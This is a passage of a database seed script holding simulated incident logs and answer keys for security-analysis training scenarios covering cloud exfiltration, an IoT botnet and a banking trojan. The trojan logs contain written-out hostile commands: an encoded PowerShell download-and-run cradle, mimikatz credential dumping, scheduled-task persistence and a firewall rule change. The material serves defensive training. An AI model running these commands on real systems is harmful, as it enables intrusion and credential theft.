db.logScenarios.insertMany([
  {
    "id": "scenario4",
    "title": "Cloud Storage Exfiltration",
    "description": "Investigate suspicious activity in a corporate AWS S3 environment where sensitive data may have been stolen.",
    "threatType": "data_exfiltration",
    "difficulty": 2,
    "timeLimit": 390,
    "logs": [
      {
        "id": "cloudtrail_log",
        "name": "AWS CloudTrail Logs",
        "type": "cloudtrail",
        "timestamp": "2025-04-18",
        "source": "aws-cloudtrail",
        "content": [
          {"text": "2025-04-18T08:12:33Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: ListBuckets, Status: Success, SourceIP: 192.168.10.45"},
          {"text": "2025-04-18T08:14:22Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: ListObjects, Resource: corporate-finance-data, Status: Success, SourceIP: 192.168.10.45"},
          {"text": "2025-04-18T08:15:05Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: ListObjects, Resource: corporate-hr-docs, Status: Success, SourceIP: 192.168.10.45"},
          {"text": "2025-04-18T08:16:12Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: GetObject, Resource: corporate-finance-data/q1_2025_projections.xlsx, Status: Success, SourceIP: 192.168.10.45"},
          {"text": "2025-04-18T10:05:33Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: GetObject, Resource: corporate-hr-docs/salary_bands_2025.pdf, Status: Success, SourceIP: 77.83.142.88"},
          {"text": "2025-04-18T10:06:15Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: GetObject, Resource: corporate-finance-data/q1_2025_projections.xlsx, Status: Success, SourceIP: 77.83.142.88"},
          {"text": "2025-04-18T10:07:22Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: GetObject, Resource: corporate-finance-data/acquisition_targets_2025.docx, Status: Success, SourceIP: 77.83.142.88"},
          {"text": "2025-04-18T10:08:45Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: CreateRole, Name: lambda-exfil-role, Status: Success, SourceIP: 77.83.142.88"},
          {"text": "2025-04-18T10:10:05Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: CreatePolicy, Name: s3-full-access-temp, Status: Success, SourceIP: 77.83.142.88"},
          {"text": "2025-04-18T10:11:33Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: AttachRolePolicy, Role: lambda-exfil-role, Policy: s3-full-access-temp, Status: Success, SourceIP: 77.83.142.88"},
          {"text": "2025-04-18T10:15:22Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: CreateFunction, Name: data-processor-util, Status: Success, SourceIP: 77.83.142.88"},
          {"text": "2025-04-18T10:18:45Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: InvokeFunction, Name: data-processor-util, Status: Success, SourceIP: 77.83.142.88"},
          {"text": "2025-04-18T10:24:12Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: CreateBucket, Name: temp-data-backup-9281, Status: Success, SourceIP: 77.83.142.88"},
          {"text": "2025-04-18T10:26:33Z INFO [CloudTrail] User: arn:aws:iam::102847563921:role/lambda-exfil-role, Event: PutObject, Resource: temp-data-backup-9281/finance_archive.zip, Status: Success, SourceIP: AWS Lambda"},
          {"text": "2025-04-18T10:28:22Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: PutBucketPolicy, Resource: temp-data-backup-9281, Status: Success, SourceIP: 77.83.142.88"},
          {"text": "2025-04-18T11:05:15Z INFO [CloudTrail] User: Anonymous, Event: GetObject, Resource: temp-data-backup-9281/finance_archive.zip, Status: Success, SourceIP: 91.135.25.12"},
          {"text": "2025-04-18T11:30:45Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: DeleteFunction, Name: data-processor-util, Status: Success, SourceIP: 77.83.142.88"},
          {"text": "2025-04-18T11:31:22Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: DetachRolePolicy, Role: lambda-exfil-role, Policy: s3-full-access-temp, Status: Success, SourceIP: 77.83.142.88"},
          {"text": "2025-04-18T11:32:05Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: DeleteRole, Name: lambda-exfil-role, Status: Success, SourceIP: 77.83.142.88"},
          {"text": "2025-04-18T11:32:45Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: DeletePolicy, Name: s3-full-access-temp, Status: Success, SourceIP: 77.83.142.88"},
          {"text": "2025-04-18T11:33:15Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: DeleteBucket, Name: temp-data-backup-9281, Status: Success, SourceIP: 77.83.142.88"},
          {"text": "2025-04-18T13:45:22Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: ListBuckets, Status: Success, SourceIP: 192.168.10.45"},
          {"text": "2025-04-18T14:22:33Z INFO [CloudTrail] User: arn:aws:iam::102847563921:user/jparker, Event: GetObject, Resource: corporate-finance-data/q1_2025_projections.xlsx, Status: Success, SourceIP: 192.168.10.45"}
        ]
      },
      {
        "id": "vpc_flow_log",
        "name": "VPC Flow Logs",
        "type": "network",
        "timestamp": "2025-04-18",
        "source": "aws-vpc",
        "content": [
          {"text": "2025-04-18T08:12:30Z 2 102847563921 eni-0d7856ebf887c3fab 192.168.10.45 52.94.236.248 50432 443 6 26 2456 1618740750 1618740810 ACCEPT OK"},
          {"text": "2025-04-18T08:14:15Z 2 102847563921 eni-0d7856ebf887c3fab 192.168.10.45 52.94.236.248 50433 443 6 38 3254 1618740855 1618740915 ACCEPT OK"},
          {"text": "2025-04-18T10:05:30Z 2 102847563921 eni-0d7856ebf887c3fab 77.83.142.88 52.94.236.248 32451 443 6 42 3845 1618748730 1618748790 ACCEPT OK"},
          {"text": "2025-04-18T10:08:40Z 2 102847563921 eni-0d7856ebf887c3fab 77.83.142.88 52.94.236.248 32455 443 6 56 5241 1618748920 1618748980 ACCEPT OK"},
          {"text": "2025-04-18T10:15:20Z 2 102847563921 eni-0d7856ebf887c3fab 77.83.142.88 54.239.28.85 32458 443 6 845 78542 1618749320 1618749380 ACCEPT OK"},
          {"text": "2025-04-18T10:26:30Z 2 102847563921 eni-0af725ebf127a9b3c 172.31.5.24 172.31.45.126 49872 443 6 1254 980542 1618749990 1618750050 ACCEPT OK"},
          {"text": "2025-04-18T11:05:10Z 2 102847563921 eni-0d7856ebf887c3fab 91.135.25.12 52.216.108.27 39451 443 6 1485 1254870 1618752310 1618752370 ACCEPT OK"},
          {"text": "2025-04-18T11:30:40Z 2 102847563921 eni-0d7856ebf887c3fab 77.83.142.88 52.94.236.248 32472 443 6 28 2745 1618753840 1618753900 ACCEPT OK"}
        ]
      },
      {
        "id": "auth_log",
        "name": "AWS IAM Authentication Log",
        "type": "auth",
        "timestamp": "2025-04-18",
        "source": "aws-iam",
        "content": [
          {"text": "2025-04-18T08:11:45Z INFO [IAM.Auth] User jparker successfully authenticated from 192.168.10.45 using password and MFA"},
          {"text": "2025-04-18T08:12:05Z INFO [IAM.Auth] New session created for jparker from 192.168.10.45, session ID: ASIAXMPL123456789012"},
          {"text": "2025-04-18T10:04:22Z INFO [IAM.Auth] User jparker attempted authentication from 77.83.142.88 using access key AKIAXMPL123456789012"},
          {"text": "2025-04-18T10:04:33Z INFO [IAM.Auth] MFA challenge sent to user jparker's registered device"},
          {"text": "2025-04-18T10:04:55Z INFO [IAM.Auth] User jparker successfully authenticated from 77.83.142.88 using access key and MFA"},
          {"text": "2025-04-18T10:05:05Z INFO [IAM.Auth] New session created for jparker from 77.83.142.88, session ID: ASIAXMPL987654321098"},
          {"text": "2025-04-18T11:35:22Z INFO [IAM.Auth] Session ASIAXMPL987654321098 terminated (logout or expiration)"},
          {"text": "2025-04-18T13:44:15Z INFO [IAM.Auth] User jparker successfully authenticated from 192.168.10.45 using password and MFA"},
          {"text": "2025-04-18T13:44:35Z INFO [IAM.Auth] New session created for jparker from 192.168.10.45, session ID: ASIAXMPL567890123456"}
        ]
      }
    ],
    "threats": [
      {
        "type": "data_exfiltration",
        "name": "AWS S3 Data Exfiltration",
        "description": "Attacker accessed sensitive data in S3 buckets using compromised credentials and exfiltrated data via a temporary bucket with public access."
      },
      {
        "type": "credential_theft",
        "name": "AWS IAM Credential Compromise",
        "description": "Attacker obtained and used legitimate user credentials to access cloud resources from an unusual location."
      }
    ],
    "threatOptions": [
      {
        "type": "data_exfiltration",
        "name": "AWS S3 Data Exfiltration",
        "description": "Attacker accessed sensitive data in S3 buckets using compromised credentials and exfiltrated data via a temporary bucket with public access."
      },
      {
        "type": "credential_theft",
        "name": "AWS IAM Credential Compromise",
        "description": "Attacker obtained and used legitimate user credentials to access cloud resources from an unusual location."
      },
      {
        "type": "intrusion",
        "name": "IAM Role Privilege Escalation",
        "description": "Creation of new roles with elevated privileges to gain unauthorized access to resources."
      },
      {
        "type": "data_exfiltration",
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "Exploiting AWS metadata services to exfiltrate IAM credentials and access sensitive data."
      },
      {
        "type": "intrusion",
        "name": "Lambda Function Code Injection",
        "description": "Malicious code injected into serverless functions to maintain persistence in the cloud environment."
      },
      {
        "type": "malware",
        "name": "Crypto Mining in Lambda",
        "description": "Unauthorized use of Lambda compute resources for cryptocurrency mining operations."
      },
      {
        "type": "ddos",
        "name": "API Gateway Rate Limit Bypass",
        "description": "Exploitation of AWS API Gateway to bypass rate limiting and perform DDoS attacks."
      },
      {
        "type": "intrusion",
        "name": "ECS Task Definition Manipulation",
        "description": "Modification of container task definitions to run unauthorized workloads."
      },
      {
        "type": "data_exfiltration",
        "name": "CloudTrail Log Tampering",
        "description": "Manipulation or deletion of CloudTrail logs to hide evidence of unauthorized activity."
      },
      {
        "type": "intrusion",
        "name": "VPC Peering Abuse",
        "description": "Unauthorized VPC peering connections to access isolated network segments."
      },
      {
        "type": "credential_theft",
        "name": "Parameter Store Secret Extraction",
        "description": "Unauthorized access and extraction of secrets from AWS Systems Manager Parameter Store."
      },
      {
        "type": "intrusion",
        "name": "Cross-Account Role Assumption",
        "description": "Unauthorized assumption of roles across AWS accounts to expand access."
      }
    ],
    "suspiciousLines": [4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 26, 27, 28, 30, 31],
    "knownEntities": {
      "ips": [
        {"address": "192.168.10.45", "info": "Office IP - Finance Department"},
        {"address": "77.83.142.88", "info": "Unknown external IP - Eastern Europe"},
        {"address": "91.135.25.12", "info": "Unknown external IP - Asia-Pacific"},
        {"address": "172.31.5.24", "info": "AWS Lambda service IP"}
      ],
      "users": [
        {"username": "jparker", "role": "Senior Financial Analyst"},
        {"username": "lambda-exfil-role", "role": "Suspicious IAM role - recently created and deleted"}
      ]
    }
  },
  {
    "id": "scenario5",
    "title": "IoT Botnet Infection",
    "description": "Investigate unusual network traffic patterns from IoT security cameras that might indicate botnet infection.",
    "threatType": "malware",
    "difficulty": 2,
    "timeLimit": 360,
    "logs": [
      {
        "id": "firewall_log",
        "name": "Network Firewall Logs",
        "type": "firewall",
        "timestamp": "2025-04-19",
        "source": "perimeter-fw01",
        "content": [
          {"text": "2025-04-19T01:12:33Z INFO [FW.ACCEPT] src=203.0.113.45 dst=8.8.8.8 proto=UDP sport=53204 dport=53 type=DNS"},
          {"text": "2025-04-19T01:15:45Z INFO [FW.ACCEPT] src=10.100.50.101 dst=203.0.113.45 proto=TCP sport=443 dport=50322 type=HTTPS"},
          {"text": "2025-04-19T01:22:15Z INFO [FW.ACCEPT] src=10.100.50.102 dst=203.0.113.45 proto=TCP sport=443 dport=50346 type=HTTPS"},
          {"text": "2025-04-19T02:05:22Z INFO [FW.ACCEPT] src=10.100.50.103 dst=93.184.216.34 proto=TCP sport=50498 dport=80 type=HTTP"},
          {"text": "2025-04-19T02:15:33Z INFO [FW.ACCEPT] src=10.100.50.104 dst=93.184.216.34 proto=TCP sport=50512 dport=80 type=HTTP"},
          {"text": "2025-04-19T02:30:15Z WARNING [FW.ACCEPT] src=10.100.50.105 dst=185.244.25.187 proto=TCP sport=50545 dport=8080 type=HTTP-ALT"},
          {"text": "2025-04-19T03:15:22Z WARNING [FW.ACCEPT] src=10.100.50.106 dst=185.244.25.187 proto=TCP sport=50602 dport=8080 type=HTTP-ALT"},
          {"text": "2025-04-19T03:33:45Z INFO [FW.ACCEPT] src=10.100.50.107 dst=203.0.113.45 proto=TCP sport=443 dport=50645 type=HTTPS"},
          {"text": "2025-04-19T04:05:12Z WARNING [FW.ACCEPT] src=10.100.50.101 dst=185.244.25.187 proto=TCP sport=50712 dport=8080 type=HTTP-ALT"},
          {"text": "2025-04-19T04:22:33Z WARNING [FW.ACCEPT] src=10.100.50.102 dst=185.244.25.187 proto=TCP sport=50734 dport=8080 type=HTTP-ALT"},
          {"text": "2025-04-19T04:45:15Z INFO [FW.ACCEPT] src=10.100.50.110 dst=8.8.8.8 proto=UDP sport=55204 dport=53 type=DNS"},
          {"text": "2025-04-19T05:12:22Z WARNING [FW.ACCEPT] src=10.100.50.103 dst=185.244.25.187 proto=TCP sport=50802 dport=8080 type=HTTP-ALT"},
          {"text": "2025-04-19T06:05:33Z WARNING [FW.ACCEPT] src=10.100.50.104 dst=103.41.58.43 proto=TCP sport=51022 dport=443 type=HTTPS"},
          {"text": "2025-04-19T06:33:45Z WARNING [FW.ACCEPT] src=10.100.50.105 dst=103.41.58.43 proto=TCP sport=51045 dport=443 type=HTTPS"},
          {"text": "2025-04-19T07:15:15Z WARNING [FW.ACCEPT] src=10.100.50.106 dst=103.41.58.43 proto=TCP sport=51134 dport=443 type=HTTPS"},
          {"text": "2025-04-19T08:05:22Z WARNING [FW.ACCEPT] src=10.100.50.107 dst=103.41.58.43 proto=TCP sport=51245 dport=443 type=HTTPS"},
          {"text": "2025-04-19T09:12:33Z INFO [FW.ACCEPT] src=192.168.10.15 dst=10.100.50.101 proto=TCP sport=52342 dport=80 type=HTTP"},
          {"text": "2025-04-19T10:05:45Z INFO [FW.DROP] src=10.100.50.101 dst=192.168.10.25 proto=TCP sport=52602 dport=445 type=SMB"},
          {"text": "2025-04-19T10:33:22Z INFO [FW.DROP] src=10.100.50.102 dst=192.168.10.26 proto=TCP sport=52645 dport=445 type=SMB"},
          {"text": "2025-04-19T11:15:33Z INFO [FW.ACCEPT] src=192.168.10.50 dst=10.100.50.102 proto=TCP sport=52845 dport=80 type=HTTP"},
          {"text": "2025-04-19T12:05:15Z WARNING [FW.ACCEPT] src=10.100.50.103 dst=91.108.23.212 proto=TCP sport=53045 dport=443 type=HTTPS"}
        ]
      },
      {
        "id": "dns_log",
        "name": "DNS Query Logs",
        "type": "dns",
        "timestamp": "2025-04-19",
        "source": "internal-dns",
        "content": [
          {"text": "2025-04-19T01:12:32Z query: camera-firmware.securecorp.com from 10.100.50.101 response: 203.0.113.45"},
          {"text": "2025-04-19T01:15:22Z query: camera-firmware.securecorp.com from 10.100.50.102 response: 203.0.113.45"},
          {"text": "2025-04-19T02:05:15Z query: cdn.example.com from 10.100.50.103 response: 93.184.216.34"},
          {"text": "2025-04-19T02:15:30Z query: cdn.example.com from 10.100.50.104 response: 93.184.216.34"},
          {"text": "2025-04-19T02:30:12Z query: ghty12l34kj.mxtpvc.cn from 10.100.50.105 response: 185.244.25.187"},
          {"text": "2025-04-19T03:15:18Z query: ghty12l34kj.mxtpvc.cn from 10.100.50.106 response: 185.244.25.187"},
          {"text": "2025-04-19T03:33:42Z query: camera-firmware.securecorp.com from 10.100.50.107 response: 203.0.113.45"},
          {"text": "2025-04-19T04:05:08Z query: ghty12l34kj.mxtpvc.cn from 10.100.50.101 response: 185.244.25.187"},
          {"text": "2025-04-19T04:22:30Z query: ghty12l34kj.mxtpvc.cn from 10.100.50.102 response: 185.244.25.187"},
          {"text": "2025-04-19T04:45:12Z query: updates.windows.com from 10.100.50.110 response: 8.8.8.8"},
          {"text": "2025-04-19T05:12:18Z query: ghty12l34kj.mxtpvc.cn from 10.100.50.103 response: 185.244.25.187"},
          {"text": "2025-04-19T06:05:30Z query: jht56po09df.kkcp.ru from 10.100.50.104 response: 103.41.58.43"},
          {"text": "2025-04-19T06:33:42Z query: jht56po09df.kkcp.ru from 10.100.50.105 response: 103.41.58.43"},
          {"text": "2025-04-19T07:15:08Z query: jht56po09df.kkcp.ru from 10.100.50.106 response: 103.41.58.43"},
          {"text": "2025-04-19T08:05:18Z query: jht56po09df.kkcp.ru from 10.100.50.107 response: 103.41.58.43"},
          {"text": "2025-04-19T12:05:12Z query: nkr78fe33pl.ddns.net from 10.100.50.103 response: 91.108.23.212"}
        ]
      },
      {
        "id": "iot_monitor_log",
        "name": "IoT Device Monitoring",
        "type": "device",
        "timestamp": "2025-04-19",
        "source": "iot-monitor",
        "content": [
          {"text": "2025-04-19T00:05:22Z INFO [Device: CAMERA-01 (10.100.50.101)] CPU usage: 15%, Memory: 42%, Status: NORMAL"},
          {"text": "2025-04-19T00:05:23Z INFO [Device: CAMERA-02 (10.100.50.102)] CPU usage: 12%, Memory: 38%, Status: NORMAL"},
          {"text": "2025-04-19T01:05:22Z INFO [Device: CAMERA-01 (10.100.50.101)] CPU usage: 18%, Memory: 45%, Status: NORMAL"},
          {"text": "2025-04-19T01:05:23Z INFO [Device: CAMERA-02 (10.100.50.102)] CPU usage: 14%, Memory: 40%, Status: NORMAL"},
          {"text": "2025-04-19T02:05:22Z INFO [Device: CAMERA-03 (10.100.50.103)] CPU usage: 65%, Memory: 75%, Status: WARNING"},
          {"text": "2025-04-19T02:05:23Z INFO [Device: CAMERA-04 (10.100.50.104)] CPU usage: 72%, Memory: 80%, Status: WARNING"},
          {"text": "2025-04-19T03:05:22Z INFO [Device: CAMERA-05 (10.100.50.105)] CPU usage: 78%, Memory: 85%, Status: WARNING"},
          {"text": "2025-04-19T03:05:23Z INFO [Device: CAMERA-06 (10.100.50.106)] CPU usage: 82%, Memory: 88%, Status: WARNING"},
          {"text": "2025-04-19T04:05:22Z INFO [Device: CAMERA-01 (10.100.50.101)] CPU usage: 75%, Memory: 82%, Status: WARNING"},
          {"text": "2025-04-19T04:05:23Z INFO [Device: CAMERA-02 (10.100.50.102)] CPU usage: 80%, Memory: 85%, Status: WARNING"},
          {"text": "2025-04-19T05:05:22Z INFO [Device: CAMERA-03 (10.100.50.103)] CPU usage: 82%, Memory: 87%, Status: WARNING"},
          {"text": "2025-04-19T06:05:22Z INFO [Device: CAMERA-07 (10.100.50.107)] CPU usage: 85%, Memory: 90%, Status: CRITICAL"},
          {"text": "2025-04-19T07:05:22Z INFO [Device: CAMERA-04 (10.100.50.104)] CPU usage: 88%, Memory: 92%, Status: CRITICAL"},
          {"text": "2025-04-19T08:05:22Z INFO [Device: CAMERA-05 (10.100.50.105)] CPU usage: 90%, Memory: 93%, Status: CRITICAL"},
          {"text": "2025-04-19T09:05:22Z INFO [Device: CAMERA-06 (10.100.50.106)] CPU usage: 91%, Memory: 94%, Status: CRITICAL"},
          {"text": "2025-04-19T10:05:22Z INFO [Device: CAMERA-07 (10.100.50.107)] CPU usage: 92%, Memory: 95%, Status: CRITICAL"},
          {"text": "2025-04-19T11:05:22Z INFO [Device: OFFICE-PC (10.100.50.110)] CPU usage: 35%, Memory: 65%, Status: NORMAL"},
          {"text": "2025-04-19T12:05:22Z INFO [Device: CAMERA-01 (10.100.50.101)] CPU usage: 82%, Memory: 91%, Status: CRITICAL - Detected unexpected process: mipsel-unknown-linux"}
        ]
      }
    ],
    "threats": [
      {
        "type": "malware",
        "name": "IoT Botnet Infection",
        "description": "IoT security cameras infected with botnet malware connecting to C2 servers and consuming excessive system resources."
      },
      {
        "type": "intrusion",
        "name": "Internal Network Scanning",
        "description": "Infected devices attempting to scan internal network for vulnerable SMB services."
      }
    ],
    "threatOptions": [
      {
        "type": "malware",
        "name": "IoT Botnet Infection",
        "description": "IoT security cameras infected with botnet malware connecting to C2 servers and consuming excessive system resources."
      },
      {
        "type": "intrusion",
        "name": "Internal Network Scanning",
        "description": "Infected devices attempting to scan internal network for vulnerable SMB services."
      },
      {
        "type": "malware",
        "name": "Mirai Variant",
        "description": "IoT malware specifically targeting IP cameras with default credentials."
      },
      {
        "type": "ddos",
        "name": "DDoS Attack Preparation",
        "description": "Infected devices being prepared as part of a distributed denial of service attack network."
      },
      {
        "type": "data_exfiltration",
        "name": "Video Stream Hijacking",
        "description": "Unauthorized access to security camera feeds for surveillance or data collection."
      },
      {
        "type": "credential_theft",
        "name": "Default IoT Credential Abuse",
        "description": "Exploitation of factory default credentials to gain access to IoT devices."
      },
      {
        "type": "intrusion",
        "name": "Firmware Exploitation",
        "description": "Remote exploit of firmware vulnerability in camera devices allowing code execution."
      },
      {
        "type": "malware",
        "name": "Cryptomining on IoT",
        "description": "Unauthorized use of IoT processing power for cryptocurrency mining operations."
      },
      {
        "type": "intrusion",
        "name": "RTSP Protocol Abuse",
        "description": "Exploitation of Real Time Streaming Protocol to gain control of cameras."
      },
      {
        "type": "data_exfiltration",
        "name": "Covert Audio Surveillance",
        "description": "Activation of microphones on security cameras for unauthorized eavesdropping."
      },
      {
        "type": "malware",
        "name": "IoT Ransomware",
        "description": "Malware that disables IoT functionality until a ransom is paid."
      },
      {
        "type": "ddos",
        "name": "TCP SYN Flood Preparation",
        "description": "Infected devices configured to participate in TCP SYN flood attacks."
      }
    ],
    "suspiciousLines": [5, 6, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54],
    "knownEntities": {
      "ips": [
        {"address": "10.100.50.101", "info": "IoT Security Camera 01"},
        {"address": "10.100.50.102", "info": "IoT Security Camera 02"},
        {"address": "10.100.50.103", "info": "IoT Security Camera 03"},
        {"address": "10.100.50.104", "info": "IoT Security Camera 04"},
        {"address": "10.100.50.105", "info": "IoT Security Camera 05"},
        {"address": "10.100.50.106", "info": "IoT Security Camera 06"},
        {"address": "10.100.50.107", "info": "IoT Security Camera 07"},
        {"address": "10.100.50.110", "info": "IT Office PC"},
        {"address": "203.0.113.45", "info": "Legitimate Camera Firmware Server"},
        {"address": "185.244.25.187", "info": "Unknown External IP"},
        {"address": "103.41.58.43", "info": "Unknown External IP"},
        {"address": "91.108.23.212", "info": "Unknown External IP"}
      ],
      "users": [
        {"username": "camera-system", "role": "Camera System Service Account"}
      ]
    }
  },
  {
    "id": "scenario6",
    "title": "Banking Trojan Credential Theft",
    "description": "Investigate suspicious activity on a financial workstation that may indicate credential theft by a banking trojan.",
    "threatType": "credential_theft",
    "difficulty": 3,
    "timeLimit": 420,
    "logs": [
      {
        "id": "process_log",
        "name": "Process Creation Events",
        "type": "process",
        "timestamp": "2025-04-20",
        "source": "endpoint-FNWKS042",
        "content": [
          {"text": "2025-04-20T09:15:33Z INFO [Process.Create] User: FINBANK\\mwilliams, Process: outlook.exe (PID: 4582), Parent: explorer.exe (PID: 2344)"},
          {"text": "2025-04-20T09:22:15Z INFO [Process.Create] User: FINBANK\\mwilliams, Process: winword.exe (PID: 4612), Parent: outlook.exe (PID: 4582)"},
          {"text": "2025-04-20T09:22:18Z INFO [Process.Create] User: FINBANK\\mwilliams, Process: EXCEL.EXE (PID: 4628), Parent: winword.exe (PID: 4612)"},
          {"text": "2025-04-20T09:22:22Z WARNING [Process.Create] User: FINBANK\\mwilliams, Process: cmd.exe (PID: 4645), Parent: EXCEL.EXE (PID: 4628)"},
          {"text": "2025-04-20T09:22:25Z WARNING [Process.Create] User: FINBANK\\mwilliams, Process: powershell.exe (PID: 4652), Parent: cmd.exe (PID: 4645)"},
          {"text": "2025-04-20T09:22:28Z WARNING [Process.Create] User: FINBANK\\mwilliams, Command Line: 'powershell.exe -e JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7ACQAYwAuAGQAbwB3AG4AbABvAGEAZABmAGkAbABlACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMQAyADkALgA2ADIALgA0ADgALwBiAC4AZQB4AGUAJwAsACcAQwA6AFwAVABlAG0AcABcAHMAeQBzADMAMgAuAGUAeABlACcAKQA7AFMADABJAC0AMgA=' (Base64 encoded)"},
          {"text": "2025-04-20T09:22:35Z WARNING [Process.Create] User: FINBANK\\mwilliams, Process: C:\\Temp\\sys32.exe (PID: 4670), Parent: powershell.exe (PID: 4652)"},
          {"text": "2025-04-20T09:22:45Z INFO [Process.Create] User: FINBANK\\mwilliams, Process: chrome.exe (PID: 4685), Parent: explorer.exe (PID: 2344)"},
          {"text": "2025-04-20T09:45:15Z WARNING [Process.Create] User: SYSTEM, Process: sys32.exe (PID: 4712), Parent: services.exe (PID: 672)"},
          {"text": "2025-04-20T09:45:20Z WARNING [Process.Create] User: SYSTEM, Process: regsvr32.exe (PID: 4725), Parent: sys32.exe (PID: 4712)"},
          {"text": "2025-04-20T09:45:25Z WARNING [Process.Create] User: SYSTEM, Process: schtasks.exe (PID: 4732), Parent: sys32.exe (PID: 4712), Command Line: 'schtasks /create /tn \"System Update Service\" /tr C:\\Temp\\sys32.exe /sc DAILY /st 09:00 /ru \"SYSTEM\"'"},
          {"text": "2025-04-20T09:50:15Z WARNING [Process.Create] User: SYSTEM, Process: netsh.exe (PID: 4745), Parent: sys32.exe (PID: 4712), Command Line: 'netsh advfirewall firewall add rule name=\"System Service\" dir=in action=allow program=\"C:\\Temp\\sys32.exe\" enable=yes'"},
          {"text": "2025-04-20T10:15:33Z INFO [Process.Create] User: FINBANK\\mwilliams, Process: iexplore.exe (PID: 4825), Parent: explorer.exe (PID: 2344)"},
          {"text": "2025-04-20T10:22:45Z WARNING [Process.Create] User: FINBANK\\mwilliams, Process: mimikatz.exe (PID: 4840), Parent: sys32.exe (PID: 4712)"},
          {"text": "2025-04-20T10:22:50Z WARNING [Process.Create] Command Line: 'mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" exit'"},
          {"text": "2025-04-20T10:25:15Z WARNING [Process.Create] User: SYSTEM, Process: net.exe (PID: 4865), Parent: sys32.exe (PID: 4712), Command Line: 'net use \\\\fileserver\\banking /user:FINBANK\\admin.svc Hunter2Secure!Pass123'"},
          {"text": "2025-04-20T11:05:22Z INFO [Process.Create] User: FINBANK\\mwilliams, Process: Teams.exe (PID: 4912), Parent: explorer.exe (PID: 2344)"},
          {"text": "2025-04-20T11:22:33Z WARNING [Process.Create] User: SYSTEM, Process: cmd.exe (PID: 4950), Parent: sys32.exe (PID: 4712), Command Line: 'cmd.exe /c copy C:\\Users\\mwilliams\\AppData\\Roaming\\Microsoft\\Windows\\Templates\\Normal.dotm C:\\Temp\\data.bin'"},
          {"text": "2025-04-20T11:45:15Z WARNING [Process.Create] User: SYSTEM, Process: powershell.exe (PID: 5022), Parent: sys32.exe (PID: 4712), Command Line: 'powershell.exe -c \"Get-ChildItem -Path C:\\Users\\mwilliams\\Documents -Filter *.xlsx | Select-Object -First 10 | Copy-Item -Destination C:\\Temp\\staging\\\"'"}
        ]
      },
      {
        "id": "network_log",
        "name": "Network Connection Events",
        "type": "network",
        "timestamp": "2025-04-20",
        "source": "endpoint-FNWKS042",
        "content": [
          {"text": "2025-04-20T09:15:45Z INFO [Net.Connection] Process: outlook.exe (PID: 4582), Local: 10.50.20.42:50123, Remote: 10.50.1.25:443, State: ESTABLISHED, Protocol: HTTPS"},
          {"text": "2025-04-20T09:22:30Z WARNING [Net.Connection] Process: powershell.exe (PID: 4652), Local: 10.50.20.42:50145, Remote: 185.129.62.48:80, State: ESTABLISHED, Protocol: HTTP"},
          {"text": "2025-04-20T09:22:38Z INFO [Net.Connection] Process: chrome.exe (PID: 4685), Local: 10.50.20.42:50150, Remote: 142.250.185.46:443, State: ESTABLISHED, Protocol: HTTPS"},
          {"text": "2025-04-20T09:45:30Z WARNING [Net.Connection] Process: sys32.exe (PID: 4712), Local: 10.50.20.42:50175, Remote: 91.243.87.22:443, State: ESTABLISHED, Protocol: HTTPS"},
          {"text": "2025-04-20T09:50:45Z WARNING [Net.Connection] Process: sys32.exe (PID: 4712), Local: 10.50.20.42:50195, Remote: 91.243.87.22:8443, State: ESTABLISHED, Protocol: HTTPS"},
          {"text": "2025-04-20T10:15:22Z INFO [Net.Connection] Process: iexplore.exe (PID: 4825), Local: 10.50.20.42:50245, Remote: 10.50.1.15:443, State: ESTABLISHED, Protocol: HTTPS"},
          {"text": "2025-04-20T10:30:15Z WARNING [Net.Connection] Process: sys32.exe (PID: 4712), Local: 10.50.20.42:50275, Remote: 10.50.1.100:445, State: ESTABLISHED, Protocol: SMB"},
          {"text": "2025-04-20T10:35:22Z WARNING [Net.Connection] Process: sys32.exe (PID: 4712), Local: 10.50.20.42:50285, Remote: 91.243.87.22:443, State: ESTABLISHED, Protocol: HTTPS"},
          {"text": "2025-04-20T11:05:45Z INFO [Net.Connection] Process: Teams.exe (PID: 4912), Local: 10.50.20.42:50345, Remote: 52.112.120.34:443, State: ESTABLISHED, Protocol: HTTPS"},
          {"text": "2025-04-20T11:15:33Z WARNING [Net.DNS] Query: secure-banking-update.com, Response: 185.129.62.48, Process: sys32.exe (PID: 4712)"},
          {"text": "2025-04-20T11:45:22Z WARNING [Net.Connection] Process: sys32.exe (PID: 4712), Local: 10.50.20.42:50422, Remote: 91.243.87.22:8443, State: ESTABLISHED, Protocol: HTTPS"},
